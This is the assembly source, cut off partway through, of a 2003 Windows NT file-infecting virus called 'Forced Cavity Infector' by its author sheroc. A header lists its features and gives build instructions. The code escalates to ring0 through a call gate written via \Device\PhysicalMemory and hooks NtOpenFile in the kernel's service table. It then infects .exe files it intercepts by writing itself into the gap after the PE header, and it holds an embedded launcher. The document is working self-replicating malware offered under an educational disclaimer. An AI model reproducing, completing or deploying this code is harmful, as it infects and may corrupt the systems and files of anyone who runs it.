
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                          ;;
;; FCIø > Forced Cavity Infector v0 by sheroc.              September '2003 ;;
;; ^^^^ ù ^ùùùùù ^ùùùùù ^ùùùùùùù ù^ ùù ùùùùùùù              ùùùùùùùùù ùùùùù ;;
;;                                                                          ;;
;; Platform: IA-32 running NT4+ OS: NT4, W2K, WXP, W2K3, Longhorn betas...  ;;
;;                                                                          ;;
;; Features: - Goes Ring0 by \Device\PhysicalMemory edition ( R0 CallGate ) ;;
;;           - Allocates non paged memory and copies itself there           ;;
;;           - Finds NtOpenFile in the Service Descriptor Table and hooks   ;;
;;           the service so that it points to our own routine               ;;
;;           - Infects file by injecting the virus between the end of the   ;;
;;           PE header and the begining of the first sectionïs data:        ;;
;;                                                                          ;;
;;           v          vv                                              v   ;;
;;           [MZ...PE...][SECTION1 DATA][SECTION2 DATA]...[SECTIONn DATA]   ;;
;;       //         //   |    gets changed to this:                     |   ;;
;;    v          v *NEW* v                                              v   ;;
;;    [MZ...PE...][VIRUS][SECTION1 DATA][SECTION2 DATA]...[SECTIONn DATA]   ;;
;;                                                                          ;;
;;           - Infected files dont execute the virus and then the original  ;;
;;           host code, instead of that, the original code runs exactly as  ;;
;;           if the file wasnt infected, and when it exits ( by a JMP/CALL  ;;
;;           [ExitProcess] ), the control is transferred to the virus code. ;;
;;           This might stop some AVs from tracing virus code... but to be  ;;
;;           honest, I havent tried this fact :P                            ;;
;;           - Although first assembled binary has 2304 bytes and vl.exe is ;;
;;           bigger than 3 KB, further infections will increase filesize by ;;
;;           2048 bytes, thats the physical size of this little organism ;P ;;
;;                                                                          ;;
;; Payload:  No payload :) ( maybe some bug that fucks up some file or some ;;
;;           bad situation in which a BSOD could be triggered... )          ;;
;;                                                                          ;;
;; Notes:    - The virus is not too infectious ( however it has even given  ;;
;;           me some surprise ) since it does "too much" sanity checks      ;;
;;           ( which I consider NEEDED checks ).                            ;;
;;           - While I was doing the testing of the virus, I saw that the   ;;
;;           tendencies of compiled PE binaries is good for future normal   ;;
;;           cavity infectors ( FileAlignment == 1000h ;D ) and I even had  ;;
;;           the temptation to include some little changes so that the code ;;
;;           would be able to try normal cavity infection and use this kind ;;
;;           of forced cavity otherwise ( that would have been good, would  ;;
;;           have been possible to infect most exes from now on ). Anyway,  ;;
;;           I wanted to keep virus size under 2048 bytes and also I wanted ;;
;;           it to be robust, so here it is, just "as is".                  ;;
;;                                                                          ;;
;; Thanks:   - Mark Russinovich, David Solomon, EliCZ and others for such a ;;
;;   &       good research in NT internals ( \Device\PhysicalMemory, paging ;;
;; Greets    and memory organisation, and a big list of other stuff ).      ;;
;;           - ElGado ( henky_0 ) for first showing me this ring0 stuff for ;;
;;           NTs. Thanks man, your acid sounded 64KB demo ruled Euskal 11 ! ;;
;;           - mscorlib, nuMIT_or, remains & vallez for helping with kernel ;;
;;           mode and other stuff ;) seeing forward to see your creations ! ;;
;;           - #ghost and #euskal_linux at irc.freenode.org and #virus and  ;;
;;           #crackers at irc.irc-hispano.org                               ;;
;;           - 29A & the ezine for being such a gold mine in VX stuff, and  ;;
;;           DTF & the ezine, hey people, keep going !                      ;;
;;           - eVok, Topo[LB] and zert: waiting for your stuff too :)       ;;
;;           - All my class mates and my friends circle in general ( this   ;;
;;           includes some on the net too ) ;D                              ;;
;;           - All the people that I forgot to mention, sorry... :S         ;;
;;                                                                          ;;
;; WARNING:  - I am NOT ( in any way ) responsible for the possible damage  ;;
;;           that might be derived from the use and/or abuse of any kind of ;;
;;           information found in this document. The contents found herein  ;;
;;           are being given for pure educational purposes only.            ;;
;;                                                                          ;;
;; * I dedicate this little happy appy to all the people that tries to keep ;;
;; "live and let live" everyday, my fire keeps burning high and sparky for  ;;
;; you, the ones that found the way to live in a happy bubble in this saddy ;;
;; world :D. Keep goind, hold on tight and as always, squeeze the juice of  ;;
;; life to the max !                                                        ;;
;;                                                                          ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; NOTE: This is V.ASM file, but it is not executable in itself ( it is a raw,
;       binary snippet. So in orther to launch the virus, one should cut off
;       the embedded VL.ASM file ( just below ) and assemble it after having
;       assembled this V.ASM as a raw binary. Also, this would need, my NASM32
;       PACKAGE ( http://www.freewebs.com/remains/nasm32package.exe ) to be
;       able to assemble, since it uses its EQUs and data declaration engine.

;--8<--[VL.ASM]---------------------------------------------------------------
;
; ; V.ASM is the virus in itself, just assemble it as a raw binary
; ; "nasmw.exe -O3 -Ic:\nasm\inc v.asm" and V ( without extension )
; ; file will be generated. Then just "nasmw.exe -f obj vl.asm" and
; ; "alink.exe -oPE vl.obj" to generate VL.EXE ( the launcher for V ).
;
; extern ExitProcess
; import ExitProcess kernel32.dll
;
; section code use32
;
; Virus:                          incbin "V"
;
; ..start:                        push Virus
;                                 ret
;
;--8<-------------------------------------------------------------------------

;--8<--[V.ASM]----------------------------------------------------------------

                                %include "win32np.inc"

                                bits 32


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; CODE


Virus:                          db 'FCIø'       ; Forced Cavity Infector v0 ( this is the signature of this little organism, it gets executed too 8-D )

                                ; This is a loader that copies the whole virus to stack
                                mov esi,[esp-4] ; we where called by a PUSH VIRUS_ADDRESS; RET, so the VIRUS_ADDRESS ( delta handle ) is still on stack, and we "fish" it :P

                                and esp,0FFFFFFFCh      ; align stack to DWORD boundary ( needed to preserve the alignment of EBP so that some crucial data is aligned too )

                                cld     ; we never know...

                                mov ecx,esp
                                enter Virus_size_memory,0       ; we allocate the needed space on the stack 
                                mov edi,esp
                                sub ecx,esp
                                rep movsb       ; we copy ourselves there

                                lea eax,[esp+InStackExecutionStart-Virus]       ; This -Virus shouldnt be needed but NASM is a 2 pass assembler and sometimes needs help for optimizing ( he doesnt "know" the size of the offset fits in -128..127 without the -Virus )
                                jmp eax ; Jump to on stack virus copy ( to the code starting from InStackExecutionStart )

InStackExecutionStart:          mov ebp,esp     ; see previous loader code, it will be clear then

                                sldt cx ; Are we running into a non-NT machine? ; hehe, this also detects VMWARE alike virtual machines };P
                                dec ecx
                                jns Exit                ; if this is the case, exit.

                                mov eax,[ebp+AddressOfExitProcessIntoIAT]       ; we get ExitProcess address from IAT

                                mov ebx,[eax]           ; Clue
				mov eax,00010000h	; Alignment
				call SolveModuleBase

                                cmp word [ebx+IMAGE_DOS_HEADER.e_csum],'SH'     ; Are we already resident?
                                jz Exit ; if this is the case, exit.

                                mov [ebp+KERNEL32Base],ebx      ; we save kernel32 base for later use ( to mark residency in ring0 )

                                lea edi,[ebp+KERNEL32ApiCalls]
                                lea esi,[ebp+KERNEL32ApiCRC32s]
                                call SolveModuleExports ; we solve kernel32's APIs that we need to use ( dynamic importing like GetProcAddress )

                                call ADVAPI32Pushed
                                db 'ADVAPI32',0
ADVAPI32Pushed:                 call [ebp+LoadLibraryA] ; we load needed ADVAPI32.DLL library
                                xchg ebx,eax

                                lea edi,[ebp+ADVAPI32ApiCalls]
                                lea esi,[ebp+ADVAPI32ApiCRC32s]
                                call SolveModuleExports ; we solve advapi32's APIs that we need to use

                                call NTDLLPushed
                                db 'NTDLL',0
NTDLLPushed:                    call [ebp+LoadLibraryA] ; we load needed NTDLL.DLL library
                                xchg ebx,eax

                                lea edi,[ebp+NTDLLApiCalls]
                                lea esi,[ebp+NTDLLApiCRC32s]
                                call SolveModuleExports ; we solve ntdll's APIs that we need to use

                                ; We fill MyOBJECT_ATTRIBUTES struct dynamically.

                                lea edi,[ebp+MyOBJECT_ATTRIBUTES]

                                xor eax,eax
                                mov al,OBJECT_ATTRIBUTES_size   ; EAX=OBJECT_ATTRIBUTES_size
                                stosd   ; xat Length,dd OBJECT_ATTRIBUTES_size

                                xor eax,eax
                                stosd   ; xat RootDirectory,dd 0

                                lea eax,[ebp+MyUNICODE_STRING]
                                stosd   ; xat ObjectName,dd MyUNICODE_STRING

                                xor eax,eax
                                mov al,OBJ_CASE_INSENSITIVE     ; EAX=OBJ_CASE_INSENSITIVE
                                stosd   ; xat Attributes,dd OBJ_CASE_INSENSITIVE

                                xor eax,eax
                                stosd   ; xat SecurityDescriptor,dd NULL

                                stosd   ; xat SecurityQualityOfService,dd NULL

                                ; We fill MyUNICODE_STRING struct dynamically.

                                mov ax,DevicePhysicalMemory_size
                                stosw   ; xat Length,dw DevicePhysicalMemory_size

                                stosw   ; xat MaximumLength,dw DevicePhysicalMemory_size
                                
                                lea eax,[ebp+DevicePhysicalMemory]
                                stosd   ; xat Buffer,dd DevicePhysicalMemory

                                ; We fill MyEXPLICIT_ACCESS struct dynamically.

                                xor eax,eax
                                inc eax
                                inc eax ; EAX=00000002h > SECTION_MAP_WRITE
                                stosd   ; xat grfAccessPermissions,dd SECTION_MAP_WRITE

                                dec eax ; EAX=00000001h > GRANT_ACCESS
                                stosd   ; xat grfAccessMode,dd GRANT_ACCESS

                                dec eax ; EAX=00000000h > NO_INHERITANCE
                                stosd   ; xat grfInheritance,dd NO_INHERITANCE

                                stosd   ; xat Trustee.pMultipleTrustee,dd NULL

                                stosd   ; xat Trustee.MultipleTrusteeOperation,dd NO_MULTIPLE_TRUSTEE

                                inc eax ; EAX=00000001h > TRUSTEE_IS_NAME

                                stosd   ; xat Trustee.TrusteeForm,dd TRUSTEE_IS_NAME

                                stosd   ; xat Trustee.TrusteeType,dd TRUSTEE_IS_USER

                                lea eax,[ebp+CURRENTUSER]
                                stosd   ; xat Trustee.ptstrName,dd CURRENTUSER

                                call StringsDataPushed
                                db 'CURRENT_USER'
                                db '\'+1,'D'+1,'e'+1,'v'+1,'i'+1,'c'+1,'e'+1,'\'+1,'P'+1,'h'+1,'y'+1,'s'+1,'i'+1,'c'+1,'a'+1,'l'+1,'M'+1,'e'+1,'m'+1,'o'+1,'r'+1,'y'+1,1
StringsDataPushed:              pop esi

                                ; we now fill CURRENTUSER with "CURRENT_USER",0

                                movsd
                                movsd
                                movsd
                                xor eax,eax
                                stosd

                                ; we now fill DevicePhysicalMemory with its expanded unicode string

ExpandNextCharacter:            lodsb
                                dec eax
                                stosw
                                jnz ExpandNextCharacter

                                ;;;


                                push THREAD_PRIORITY_TIME_CRITICAL
                                push 0FFFFFFFEh ; FFFFFFFEh is a pseudo handle ( current thread )
                                call [ebp+SetThreadPriority]    ; We bost our thread.

                                sgdt [ebp+MyGDTR]       ; We save GDTs base address

                                lea eax,[ebp+MyOBJECT_ATTRIBUTES]       ; we open \Device\PhysicalMemory
                                push eax
                                push READ_CONTROL | WRITE_DAC
                                lea eax,[ebp+MyhSection]
                                push eax
                                call [ebp+NtOpenSection]        ; Similar to openfilemapping, but it can map kernel objects and so on.
                                test eax,eax                    ; STATUS_SUCCESS ?
                                jnz Exit        ; if not, exit.

                                xchg ebx,eax

                                lea eax,[ebp+pSecurityDescriptor]
                                push eax
                                push ebx
                                lea eax,[ebp+pDacl]
                                push eax
                                push ebx
                                push ebx
				push DACL_SECURITY_INFORMATION
				push SE_KERNEL_OBJECT
                                push dword [ebp+MyhSection]
                                call [ebp+GetSecurityInfo]      ; we get security info for \Device\PhysicalMemory

                                lea eax,[ebp+pNewAcl]
                                push eax
                                push dword [ebp+pDacl]
                                lea eax,[ebp+MyEXPLICIT_ACCESS]
                                push eax
				push 1
                                call [ebp+SetEntriesInAclA]     ; we add write permission to \Device\PhysicalMemoryïs permission list

                                push ebx
                                push dword [ebp+pNewAcl]
                                push ebx
                                push ebx
				push DACL_SECURITY_INFORMATION
				push SE_KERNEL_OBJECT
                                push dword [ebp+MyhSection]
                                call [ebp+SetSecurityInfo]      ; and we set the new permission list

                                push dword [ebp+pNewAcl]
                                call [ebp+LocalFree]    ; we free no longer needed mem block

                                push dword [ebp+pSecurityDescriptor]
                                call [ebp+LocalFree]    ; we free no longer needed mem block

                                push dword [ebp+MyhSection]
                                call [ebp+CloseHandle]  ; we close object handle

                                lea eax,[ebp+MyOBJECT_ATTRIBUTES]
                                push eax
                                push dword [ebp+MyEXPLICIT_ACCESS+EXPLICIT_ACCESS.grfAccessPermissions]
                                lea eax,[ebp+MyhSection]
                                push eax
                                call [ebp+NtOpenSection]        ; and we reopen it with new security attributes ;D
                                test eax,eax                    ; STATUS_SUCCESS ?
                                jnz Exit        ; if not, exit.

                                mov eax,[ebp+MyGDTR+GDTR.Base]
                                mov edx,eax
                                and edx,00000FFFh
                                mov edi,edx
                                and eax,1FFFF000h
                                ; We have to map real/physical mem starting from a page aligned address,
                                ; even if we are accessing nonaligned data later on.
                                ; Thatïs why weïll save 12 bit offset ( offset into the page )
                                ; into EDI and we let eax aligned down to the page.
                                ; Note that we also clear most significant bits... in NT kernel
                                ; addresses near 80000000h can be treated as that,
                                ; cos, Virtual==Linear and also Linear==Real+Base

                                movzx ebx,word [ebp+MyGDTR+GDTR.Limit]
                                inc ebx
                                add edx,ebx
                                ; for the same reason, we add the distance between real address 
                                ; and page boundary aligned address ( base to map from address )
                                ; to the size of the memory we are going to map, even if we will
                                ; access to the concrete offset later.

                                xor ecx,ecx

                                push edx        ; here we push SizeOfView
                                mov edx,esp

                                push ecx        ; here we push SectionOffset with 64 bits, thats why we push ecx ( 0 ) too.
                                push eax
                                mov eax,esp

                                push ecx        ; here we push BaseAddress ( 0: "no preferred mapping base address" )
                                mov esi,esp

                                push PAGE_READWRITE
                                push ecx        ; MEM_COMIT
                                push 2  ; UnmapView
                                push edx        ; lpViewSize
                                push eax        ; lpSectionOffset
                                push ecx        ; CommitSize
                                push ecx        ; ZeroBits
                                push esi        ; lpBaseAddress
                                dec ecx
                                push ecx        ; ProcessHandle FFFFFFFFh is a pseudo handle ( current process )
                                push dword [ebp+MyhSection]        ; hSection
                                call [ebp+NtMapViewOfSection]   ; we finally map Physical Memory }:>

                                lodsd

                                add esp,16

                                lea edi,[edi+eax]       ; we adjust the offset ( with the saved offset-into-page )

                                lea eax,[ebx-8] ; AX=last available selector
                                mov [ebp+CallGateSelector],ax

                                push dword [edi+ebx-8]  ; we save the descriptor for that last selector
                                push dword [edi+ebx-4]  ; so that we can restore it later ( we arent gonna leave the descriptor there, are we? xD )

                                lea eax,[ebp+Ring0Code] ; we split the 32bit offset to our ring0 procedure into 16bit+16bit
                                mov [edi+ebx-8],ax      ; we store low 16bits
                                ror eax,16
                                mov [edi+ebx-2],ax      ; we store high 16bits
                                mov word [edi+ebx-6],0008h   ; Ring0 Code selector for Win NT.
                                mov word [edi+ebx-4],0EC00h  ; 1 11 0 1100 0000 0000 > PRESENT=1, DPL=11 ( accesible from Ring3 ), SYSTEM=0 ( Gate ), TYPE=1100 ( CallGate ), 000, WC=00000 ( Word Count to copy between stacks: 0 )

                                push Virus_size_memory
                                push ebp
                                call [ebp+VirtualLock]  ; we lock the page cos we dont want to be swapped while in ring0

                                push 0                  
                                call [ebp+Sleep]        ; this might seem tricky, it just ends threads execution time slice, so that
                                                        ; when the thread resumes execution it has the full time slice guaranteed

                                ; We jump to our beloved ring0 ;)
                                db 9Ah  ; call GSel:XXXXXXXXh ; The offset will simply be ignored, cos the selector is "pointing" to a callgate ( which specifies the offset by itslef ).
                                dd 00000000h
CallGateSelector                dw 0

                                ; here we returned from ring0 procedure ( with a retf ) so we are back in ring3

                                pop dword [edi+ebx-4]   ; we restore the saved descriptor
                                pop dword [edi+ebx-8]

                                push ebp                ; we unlock the page ( not really needed... )
                                call [ebp+VirtualUnlock]

                                push edi                ; we unmap the mapping
                                push 0FFFFFFFFh         ; FFFFFFFFh is a pseudo handle ( current process )
                                push ecx
                                call [ebp+NtUnmapViewOfSection]

                                push dword [ebp+MyhSection]
                                call [ebp+CloseHandle]  ; and we close the mapping object

Exit:                           db 0FFh,025h    ; JMP [DWORD]
AddressOfExitProcessIntoIAT     dd 00402040h    ; ExitProcess

; Ring0 Code

Ring0Code:                      cli
                                cld
                                pushad

                                ;mov eax,cr0
                                ;push eax
                                ;and eax,0FFFEFFFFh      ; we clear WP ( Ring 0 write protection ENABLE/DISABLE ) bit to disable CopyOnWrite temporally };>
                                ;mov cr0,eax             ; also, a write violation in Ring0 doesnt mean CopyOnWrite, but BSOD xDDD, cos the exception is handled incorrectly...

                                mov eax,[ebp+KERNEL32Base]

                                mov esi,eax

                                shr eax,0Ah              ; we obtain the PTE for the given virtual address
                                and eax,003FFFFCh
                                sub eax,40000000h

                                mov cl,02h

                                or [eax],cl     ; we enable write access for that page };>

                                mov [esi+IMAGE_DOS_HEADER.e_csum],word 'SH'     ; we mark our residency in KERNEL32.DLL module

                                not cl

                                and [eax],cl    ; we disable write access back for that page

                                ;pop eax
                                ;mov cr0,eax             ; we restore original state of WP bit :D

                                sidt [ebp+MyIDTR]       ; we save base address of IDT so that we can access to it

                                mov eax,[ebp+MyIDTR+IDTR.Base]

                                mov bx,[eax+(2Ah*8)+6]  ; It could be 2Eh, but softice hooks that IntGate, so weïll use 2Ah ( 00h would be ok but BoundsChecker hooks it too ;( ),
                                ror ebx,16              ; itïs just to use an IntGate whose handler resides into ntoskrnl.exe in memory.
                                mov bx,[eax+(2Ah*8)]

                                xor eax,eax
                                mov ah,10h      ; mov eax,00001000h
                                call SolveModuleBase

                                lea edi,[ebp+NTOSKRNLApiCalls]
                                lea esi,[ebp+NTOSKRNLApiCRC32s]
                                call SolveModuleExports

                                mov eax,[ebp+KeServiceDescriptorTable]  ; we obtain ServiceDescriptorTable address
                                mov edi,[eax]
                                mov ecx,[eax+8] ; we obtain NumberOfServices fieldïs value.
                                mov eax,[ebp+NtOpenFile]        ; and we search for NtOpenFileïs entry
                                repnz scasd
                                sub edi,4

                                jecxz ExitFromRing0Code         ; if we fail to locate it, just exit...

                                mov [ebp+OffsetOfNtOpenFileAddressInSDT],edi    ; prepare our hook function
                                mov [ebp+OffsetOfNtOpenFileAddressInSDT_],edi
                                mov [ebp+OriginalNtOpenFileAddress],eax
                                mov [ebp+OriginalNtOpenFileHandler],eax

                                ; Allocate nonpaged ( totally locked safe memory )
                                push 0  ; Tag ( nothing )
                                push Virus_size_memory
                                push NonPagedPool
                                call [ebp+ExAllocatePoolWithTag]

                                mov edx,edi
                                mov edi,eax

                                mov [ebp+ResidentDeltaHandle],eax       ; prepare our resident DeltaHandle in hook function

                                lea eax,[eax+NtOpenFileHookFunction]

                                mov [ebp+HookedNtOpenFileAddress],eax

                                mov esi,ebp             ; copy the whole virus body to allocated memory
                                xor ecx,ecx
                                mov ch,(Virus_size_memory/256) ; mov ecx,Virus_size_memory
                                rep movsb

                                mov [edx],eax   ; we finally enable the hook function by storing a new NtOpenFile handler address in ServiceDescriptorTable ;))

ExitFromRing0Code:              popad   ; we get back to slave ring3 ;(
                                sti
                                retf

; Hook function for NtOpenFile

NtOpenFileHookFunction:         db 0C7h,05h     ; mov dword [DWORD],DWORD > this is a pass valve, when executed all the calls to NtOpenFile will be redirected to original handler
OffsetOfNtOpenFileAddressInSDT  dd 0
OriginalNtOpenFileAddress       dd 0
                                db 68h  ; push XXXXXXXXh
OriginalNtOpenFileHandler       dd 0
                                pushfd
                                pushad
                                cld
                                db 0BDh ; mov ebp,
ResidentDeltaHandle             dd 0

                                mov edi,[esp+34h]       ; we take ObjectAttributes parameter

                                mov eax,[edi+OBJECT_ATTRIBUTES.RootDirectory]
                                test eax,eax
                                jnz ExitFromNtOpenFileHookCode

                                mov ecx,[edi+OBJECT_ATTRIBUTES.ObjectName]
                                test ecx,ecx
                                jz ExitFromNtOpenFileHookCode

                                mov esi,[ecx+UNICODE_STRING.Buffer]

                                movzx ecx,word [ecx+UNICODE_STRING.Length]

                                cmp ecx,24       ; if filename size is less than this, exit
                                jb ExitFromNtOpenFileHookCode

                                mov ebx,00200020h

                                mov eax,ebx
                                mov edx,ebx
                                or eax,[esi+12] ; we skip \??\X: ( in unicode )
                                or edx,[esi+16] ; and we both: move+lowercase
                                cmp eax,0077007Ch       ; \ 0 w 0 ( unicode "\w" ) ?
                                setz al
                                cmp edx,006E0069h       ; i 0 n 0 ( unicode "in" ) ?
                                setz dl
                                and al,dl       ; are both true? ( \ 0 w 0 i 0 n 0 )
                                jnz ExitFromNtOpenFileHookCode  ; if true, exit
                                
                                mov eax,ebx
                                mov edx,ebx
                                or eax,[esi+ecx-8]      ; we take last part ( extension )
                                or edx,[esi+ecx-4]      ; and we both: move+lowercase
                                cmp eax,0065002Eh       ; . 0 e 0 ( unicode ".e" ) ?
                                setz al
                                cmp edx,00650078h       ; x 0 e 0 ( unicode "xe" ) ?
                                setz dl
                                and al,dl       ; are both true? ( . 0 e 0 x 0 e 0 )
                                jz ExitFromNtOpenFileHookCode  ; if false, exit

                                xor ecx,ecx

                                push ecx
                                mov edx,esp

                                push ecx
                                mov esi,esp

                                push FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE ; we want all file operations to be sinchronized ( calls wont return till read/write is completed )
                                push ecx        ; share none
                                push edx        ; IoStatusBlock
                                push edi        ; ObjectAttributes ( the one we took from the caller itself )
                                push FILE_ALL_ACCESS    ; includes the NEEDED SYNCHRONIZE access flag
                                push esi
                                call [ebp+ZwOpenFile]   ; we open the possible victim file

                                mov ebx,[esi]

                                pop esi
                                pop esi

                                test eax,eax
                                jnz ExitFromNtOpenFileHookCode

                                sub esp,((FILE_STANDARD_INFORMATION_size+3)/4)*4        ; we reserve local stack space for a variable of type FILE_STANDARD_INFORMATION
                                mov esi,esp

                                push eax
                                mov eax,esp
                                
                                push FileStandardInformation
                                push FILE_STANDARD_INFORMATION_size
                                push esi
                                push eax
                                push ebx
                                call [ebp+ZwQueryInformationFile]       ; we obtain filesize among other unneeded things xD

                                mov ecx,[esi+FILE_STANDARD_INFORMATION.EndOfFile+4]     ; EndOfFile is a field of QWORD size containing the file size.

                                mov esi,[esi+FILE_STANDARD_INFORMATION.EndOfFile]

                                add esp,(((FILE_STANDARD_INFORMATION_size+3)/4)*4)+4    ; +4 because we balance the push eax&mov eax,esp above

                                test eax,eax
                                jnz ExitFromNtOpenFileHookCode_

                                test ecx,ecx
                                jnz ExitFromNtOpenFileHookCode_ ; if its bigger than 4 GB, exit ( of course xDDD )

                                xchg esi,eax

                                cmp eax,4*1024*1024     ; is size under 4MB upper limit ?
                                jnc ExitFromNtOpenFileHookCode_ ; if not under, exit

                                cmp eax,1024*4  ; is size below 4KB lower limit ?
                                jc ExitFromNtOpenFileHookCode_  ; if below, exit

                                mov edi,eax
                                lea esi,[eax+(1024*4)]

                                push 0  ; Tag ( Nothing )
                                push esi
                                push PagedPool
                                call [ebp+ExAllocatePoolWithTag]        ; we allocate temporal memory for filesize+4KB

                                test eax,eax
                                jz ExitFromNtOpenFileHookCode_

                                push eax        ; we push the returned memory address so that it can be freed later by ExFreePool

                                xchg esi,eax

                                xor ecx,ecx

                                push ecx
                                push ecx
                                mov eax,esp

                                push ecx
                                mov edx,esp

                                push ecx        ; NULL
                                push eax        ; pointer to start offset to read from ( 0: begining of file )
                                push edi        ; count of bytes to read
                                lea eax,[esi+(1024*4)]
                                push eax        ; pointer to the buffer that will receive read bytes
                                push edx        ; pointer to IoStatusBlock ( not needed really )
                                push ecx        ; NULL
                                push ecx        ; NULL
                                push ecx        ; NULL
                                push ebx        ; file handle
                                call [ebp+ZwReadFile]   ; we read from file
                                add esp,12

                                test eax,eax
                                jnz ExitFromNtOpenFileHookCode__

                                ; see InfectFile description above...
                                ; It receives EDI=File size, ESI=Buffer with 4KB space, file contents.
                                ; and returns EDI=Number of bytes to write ( new file size ) or 0 if error, ESI=Offset from where bytes to write are to be taken.
                                call InfectFile

                                test edi,edi    ; Error while trying to infect?
                                jz ExitFromNtOpenFileHookCode__

                                xor ecx,ecx

                                push ecx
                                push ecx
                                mov eax,esp

                                push ecx
                                mov edx,esp

                                push ecx        ; NULL
                                push eax        ; pointer to start offset to write to ( 0: begining of file )
                                push edi        ; count of bytes to write
                                push esi        ; pointer to the buffer that contains the bytes to be written
                                push edx        ; pointer to IoStatusBlock ( not needed really )
                                push ecx        ; NULL
                                push ecx        ; NULL
                                push ecx        ; NULL
                                push ebx        ; file handle
                                call [ebp+ZwWriteFile]  ; 
                                add esp,12

ExitFromNtOpenFileHookCode__:   call [ebp+ExFreePool]   ; we free the previously allocated temporal memory
                                                        ; note that the parameter ( base of memory block ) was pushed before calling InfectFile
ExitFromNtOpenFileHookCode_:    push ebx
                                call [ebp+ZwClose]      ; we close the file

ExitFromNtOpenFileHookCode:     popad
                                popfd
                                db 0C7h,05h     ; mov dword [DWORD],DWORD > this is the counterpart for the first instruction of this routine, when this instrucion is executed, the redirection is disabled and next call to NtOpenFile will execute our routine again
OffsetOfNtOpenFileAddressInSDT_ dd 0
HookedNtOpenFileAddress         dd 0
                                ret

; FILE INFECTION ROUTINE
;
; It receives EDI=File size, ESI=Buffer with 4KB space, file contents.
; and returns EDI=Number of bytes to write ( new file size ) or 0 if error, ESI=Offset from where bytes to write are to be taken.
;
InfectFile:                     push ebx

                                lea ebx,[esi+(1024*4)]  ; we make EBX point to the starting address of fileïs bytes

                                mov esi,[ebx+IMAGE_DOS_HEADER.e_lfanew]
                                cmp esi,1024+512        ; is the offset to new header too far ( above 1'5 KB ) ?
                                ja ErrorInfectingFile   ; if too far, exit ( this check has 2 reasons, a) we must fit into 4 KB minus original SizeOfHeader, b) some non PE EXEs have this field with an arbitrary ( big ) value, and we dont want a page fault, do we ? )

                                add esi,ebx     ; ESI now points to PE header of the file

                                cmp [esi],dword IMAGE_NT_SIGNATURE      ; Is it a PE file ( 'P','E',0,0 ) ?
                                jnz ErrorInfectingFile  ; If not, exit

                                cmp [esi+IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment],dword 00001000h
                                jnz ErrorInfectingFile  ; we wont infect PE files that have a non 4KB virtual alignment

                                cmp [esi+IMAGE_NT_HEADERS.OptionalHeader.FileAlignment],dword 00000200h
                                jnz ErrorInfectingFile  ; we wont infcet PE files that have a non 512 file alignment

                                xor ecx,ecx
                                mov ch,(Virus_size_physical/256)        ; mov ecx,Virus_size_physical

                                mov eax,[esi+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]

                                cmp eax,ecx     ; If headers are smaller than the virusïs size itslef, itïs obvious that it is not infected
                                jc FileIsNotInfected

                                mov edx,[ebp]   ; we check if the file has the virus by comparing first 4 bytes of our code ( virus code ) against the 4 bytes found in value of SizeOfHeaders minus Virus_size_physical
                                cmp [eax+ebx-Virus_size_physical],edx   ; Is it already infected?
                                jz ErrorInfectingFile

FileIsNotInfected:              add eax,ecx
                                cmp eax,0001000h        ; would original headers + our virus fit into 4KB?
                                ja ErrorInfectingFile   ; if not, exit

                                mov edx,[esi+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory+IMAGE_DATA_DIRECTORY_size*IMAGE_DIRECTORY_ENTRY_IMPORT+IMAGE_DATA_DIRECTORY.VirtualAddress]
                                test edx,edx    ; does the PE file have IMPORTs ?
                                jz ErrorInfectingFile   ; if not, we cant infect

                                ; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file
                                call ConvertRVAToPhysicalOffset ; we convert IMPORTs RVA to a offset in file
                                test edx,edx    ; error converting ?
                                jz ErrorInfectingFile

                                add edx,ebx     ; we add base address to the offset in file so we can access data

FindKERNEL32Imports:            xor ecx,ecx

                                cmp [edx],ecx   ; end of IMPORTs entry array?
                                jz EndOfIMAGE_IMPORT_DESCRIPTORs

                                mov ecx,[edx+IMAGE_IMPORT_DESCRIPTOR.Name1]     ; we take RVA to DLL name

                                xchg edx,ecx
                                call ConvertRVAToPhysicalOffset ; and we convert it so we can access it
                                test edx,edx    ; error converting ?
                                jz ErrorInfectingFile
                                xchg edx,ecx
                                add ecx,ebx

                                mov eax,[ecx]
                                or eax,20202020h        ; lowercase first 4 chars
                                cmp eax,'kern'  ; is it "kern" ?
                                jnz IMAGE_IMPORT_DESCRIPTORNoK32

                                mov eax,[ecx+4]
                                or eax,20202020h        ; lowercase next 4 chars
                                cmp eax,'el32'  ; is it "el32" ?
                                jz EndOfIMAGE_IMPORT_DESCRIPTORs

IMAGE_IMPORT_DESCRIPTORNoK32:   add edx,IMAGE_IMPORT_DESCRIPTOR_size    ; we advance through the array
                                jmp FindKERNEL32Imports

EndOfIMAGE_IMPORT_DESCRIPTORs:  test ecx,ecx    ; no kernel32 found?
                                jz ErrorInfectingFile   ; then we cant infect ;(

                                mov eax,[edx+IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk]        ; we take the imported names thunk array from KERNEL32ïs IMAGE_IMPORT_DESCRIPTOR
                                test eax,eax    ; does it have original first thunk?
                                jnz OriginalFirstThunkExists

                                mov eax,[edx+IMAGE_IMPORT_DESCRIPTOR.FirstThunk]        ; if no original thunk, the use first thunk

OriginalFirstThunkExists:       push edx        ; we save EDX so we can access to KERNEL32ïs IMAGE_IMPORT_DESCRIPTOR later

                                xchg eax,edx
                                ; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file
                                call ConvertRVAToPhysicalOffset ; we translate thunk arrayïs RVA to offset in file
                                test edx,edx    ; If the RVA wasnt OK, then pop a dword and exit ;(
                                jz ErrorWrongThunkArrayRVA

                                add edx,ebx     ; and we rebase it

                                push edx        ; this is to be able to know ExitProcess IMAGE_THUNK_DATAïs index into FirstThunk array later,
                                                ; cos we will substract this start address of the array to the ExitProcessïs thunk address
FindExitProcessIMPORT:          xor ecx,ecx

                                mov eax,[edx]

                                test eax,eax    ; end of THUNK array?
                                jz EndOfIMAGE_THUNK_DATAs

                                test eax,IMAGE_ORDINAL_FLAG32   ; 80000000h to see if its imported by ordinal
